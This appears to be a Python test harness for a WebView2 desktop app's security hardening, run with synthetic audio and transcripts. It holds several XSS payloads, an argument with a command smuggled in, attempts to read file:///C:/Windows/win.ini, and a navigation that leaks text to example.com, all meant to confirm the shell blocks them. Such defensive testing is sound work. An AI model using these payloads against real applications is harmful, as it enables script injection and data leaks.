# tools/webview_trial.py
# Issue #10 feasibility trial: run the real WebView2 shell with bundled assets
# and record evidence for each acceptance point as JSON.
#
#   python tools/webview_trial.py <synthetic.wav> <report.json>
#
# Uses only synthetic data. Audio plays muted. Opens a window for ~20 s.

import ctypes
import json
import os
import subprocess
import sys
import time
import wave
import winreg
from pathlib import Path

import numpy as np

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from workspace import shell  # noqa: E402
from workspace.bridge import Bridge  # noqa: E402

HOSTILE = ['<img src=x onerror="window.__pwned=1">',
           '<script>window.__pwned=2</script>',
           'javascript:window.__pwned=3', '</li><li onclick="window.__pwned=4">x']


def load_wav(path):
    with wave.open(str(path), "rb") as w:
        assert w.getframerate() == 16000 and w.getnchannels() == 1 and w.getsampwidth() == 2
        return np.frombuffer(w.readframes(w.getnframes()), "<i2").astype(np.float32) / 32768


def synthetic_paragraphs(n=20000):
    words = ("budget review agreed actions forecast quarter staffing report member "
             "meeting circulated capital plan operating expenses schedule").split()
    rng = np.random.default_rng(7)
    out = []
    for i in range(n):
        text = " ".join(rng.choice(words, size=int(rng.integers(8, 40))))
        if i % 997 == 5:
            text = HOSTILE[(i // 997) % len(HOSTILE)] + " " + text
        out.append((i * 4.0, f"Speaker {i % 3 + 1}", text))
    return out


def process_tree(root_pid):
    """PIDs of root and all its descendants (WebView2 runs child processes)."""
    out = subprocess.run(["powershell", "-NoProfile", "-Command",
                          "Get-CimInstance Win32_Process | ForEach-Object "
                          "{ \"$($_.ProcessId) $($_.ParentProcessId) $($_.Name)\" }"],
                         capture_output=True, text=True).stdout
    rows = [line.split(" ", 2) for line in out.splitlines() if line.strip()]
    children, names = {}, {}
    for pid, ppid, name in rows:
        children.setdefault(int(ppid), []).append(int(pid))
        names[int(pid)] = name
    tree, todo = set(), [root_pid]
    while todo:
        p = todo.pop()
        if p not in tree:
            tree.add(p)
            todo += children.get(p, [])
    return {p: names.get(p, "?") for p in tree}


def listeners(pids):
    out = subprocess.run(["netstat", "-ano"], capture_output=True, text=True).stdout
    found = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 4 and parts[0] in ("TCP", "UDP"):
            pid = int(parts[-1]) if parts[-1].isdigit() else -1
            state = parts[3] if parts[0] == "TCP" and len(parts) == 5 else ""
            if pid in pids and (parts[0] == "UDP" or state == "LISTENING"):
                found.append({"proto": parts[0], "local": parts[1], "pid": pid,
                              "process": pids[pid]})
    return found


def webview2_version():
    client = r"Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}"
    for hive, sub in ((winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\" + client),
                      (winreg.HKEY_CURRENT_USER, "SOFTWARE\\" + client)):
        try:
            with winreg.OpenKey(hive, sub) as k:
                return winreg.QueryValueEx(k, "pv")[0]
        except OSError:
            continue
    return None


JS = {
    "api_surface": """(() => { const out = [];
        const walk = (o, p) => { for (const k of Object.keys(o)) {
            const v = o[k]; const name = p ? p + '.' + k : k;
            if (typeof v === 'function') out.push(name);
            else if (v && typeof v === 'object') walk(v, name); } };
        walk(window.pywebview.api, ''); return out.sort(); })()""",
    "render": "window.trial.lastRender",
    "hostile": """[document.querySelectorAll('#transcript img, #transcript script').length,
        window.__pwned || 0,
        document.getElementById('transcript').textContent.includes('<img src=x onerror')]""",
    "playback": """(async () => { const url = await window.pywebview.api.clip(2, 5);
        const a = new Audio(); a.muted = true; a.src = url;
        await new Promise((r, j) => { a.onloadedmetadata = r; a.onerror = j; });
        const t0 = performance.now(); await a.play();
        await new Promise(r => a.onended = r);
        return {duration: a.duration, wall_s: (performance.now() - t0) / 1000,
                url_bytes: url.length}; })()""",
    "oversized_clip": """(async () => { try { await window.pywebview.api.clip(0, 120);
        return 'allowed'; } catch (e) { return 'refused: ' + (e.message || e); } })()""",
    "bad_argument": """(async () => { try { await window.pywebview.api.clip('0; import os', 5);
        return 'allowed'; } catch (e) { return 'refused: ' + (e.message || e); } })()""",
    "page_fetch_remote": """(async () => { try { await fetch('https://example.com/');
        return 'fetched'; } catch (e) { return 'blocked'; } })()""",
    "page_fetch_file": """(async () => { try { await fetch('file:///C:/Windows/win.ini');
        return 'fetched'; } catch (e) { return 'blocked'; } })()""",
    "inject_remote_script": """(async () => { let violated = 0;
        document.addEventListener('securitypolicyviolation', () => violated++);
        const s = document.createElement('script'); s.src = 'https://example.com/x.js';
        document.head.append(s); await new Promise(r => setTimeout(r, 1500));
        return {violations: violated, pwned: window.__pwned || 0}; })()""",
    "origin": "location.href",
}


def evaluate(window, js, timeout=30):
    """evaluate_js that also waits for a returned promise."""
    import threading
    if "async" not in js:      # the callback only fires for promises
        return window.evaluate_js(js)
    done, box = threading.Event(), {}

    def cb(value):
        box["v"] = value
        done.set()
    result = window.evaluate_js(js, cb)
    if done.wait(timeout):
        return box.get("v")
    return result


def run_checks(window, report, audio_s):
    try:
        window.events.loaded.wait(30)
        deadline = time.time() + 60
        ready = "!!(window.trial && window.trial.lastRender)"
        while time.time() < deadline and not window.evaluate_js(ready):
            time.sleep(0.2)
        tree = process_tree(os.getpid())
        report["listeners_idle"] = listeners(tree)      # before any test touches the network
        for name, js in JS.items():
            try:
                report[name] = evaluate(window, js)
            except Exception as exc:
                report[name] = f"error: {type(exc).__name__}: {exc}"
        tree = process_tree(os.getpid())
        report["process_tree"] = sorted(set(tree.values()))
        report["listeners"] = listeners(tree)
        # Navigation: can page script move the window to a remote site, open a
        # new window, or hand a URL (possibly carrying text) to the system browser?
        import webbrowser
        opened = []
        webbrowser.open = lambda url, *a, **k: opened.append(url)
        window.evaluate_js("location.href = 'https://example.com/?leak=transcript'")
        time.sleep(2)
        window.evaluate_js("window.open('https://example.com/popup', '_blank')")
        time.sleep(2)
        window.evaluate_js("location.href = 'file:///C:/Windows/win.ini'")
        time.sleep(2)
        # Ask the page itself: pywebview's get_current_url() reports the URL it
        # was asked to load, even when the navigation was cancelled.
        report["after_navigation_attempt"] = evaluate(window, "location.href")
        report["pywebview_reported_url"] = window.get_current_url()
        report["system_browser_opened"] = opened
        report["blocked_navigations"] = list(shell.blocked_navigations)
        report["bridge_still_works"] = evaluate(window, "window.pywebview.api.ping()")
        report["audio_seconds"] = audio_s
    finally:
        window.destroy()


def main():
    wav, out = sys.argv[1], sys.argv[2]
    if "--harden" in sys.argv:
        from workspace.shell import harden_webview2
        harden_webview2()
    audio = load_wav(wav)
    report = {
        "python": sys.version.split()[0],
        "webview2_runtime": webview2_version(),
        "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()),
        "ui_url_scheme": shell.ui_url().split(":")[0],
    }
    import webview
    report["pywebview"] = webview.__version__ if hasattr(webview, "__version__") else "?"
    bridge = Bridge(audio, synthetic_paragraphs())
    window = shell.create_window(bridge, title="Workspace trial (synthetic data)")
    t0 = time.perf_counter()
    shell.run(run_checks, (window, report, round(len(audio) / 16000, 2)))
    report["total_s"] = round(time.perf_counter() - t0, 1)
    Path(out).write_text(json.dumps(report, indent=2), encoding="utf-8")
    print(json.dumps(report, indent=2))
    # Exit non-zero if a security expectation failed.
    bad = []
    if [x for x in report.get("listeners", []) if x["proto"] == "TCP"]:
        bad.append("local TCP listener")
    if report.get("listeners_idle"):
        bad.append("sockets open while idle")
    hostile = report.get("hostile")
    if not (isinstance(hostile, list) and hostile[0] == 0 and hostile[1] == 0 and hostile[2]):
        bad.append("hostile markup")
    if not str(report.get("oversized_clip", "")).startswith("refused"):
        bad.append("oversized clip")
    if report.get("page_fetch_remote") != "blocked" or report.get("page_fetch_file") != "blocked":
        bad.append("page network/file access")
    if set(report.get("api_surface") or []) != {"clip", "ping", "transcript"}:
        bad.append("api surface")
    if not str(report.get("after_navigation_attempt", "")).startswith(shell.UI_DIR.as_uri()[:8]) \
            or "example.com" in str(report.get("after_navigation_attempt")):
        bad.append("navigation escaped")
    if report.get("system_browser_opened"):
        bad.append("system browser opened")
    print("FAILED: " + ", ".join(bad) if bad else "ALL CHECKS PASSED")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
